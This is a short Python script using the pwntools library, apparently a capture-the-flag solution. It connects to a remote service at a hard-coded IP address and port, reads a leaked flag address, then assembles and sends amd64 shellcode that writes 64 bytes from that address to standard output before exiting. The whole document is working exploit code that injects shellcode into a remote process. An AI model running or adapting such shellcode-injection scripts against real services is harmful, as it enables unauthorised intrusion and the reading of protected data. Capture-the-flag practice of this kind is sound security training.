from pwn import *

p = remote('54.85.45.101', 8005)

p.recvuntil('Flag is at 0x')
flag_addr = int(p.recvline().strip(), 16)


shellcode = asm(f'''
    mov rax, 1
    mov rdi, 1
    mov rsi, {flag_addr}
    mov rdx, 64
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall
''', arch='amd64')

p.send(shellcode)
p.interactive()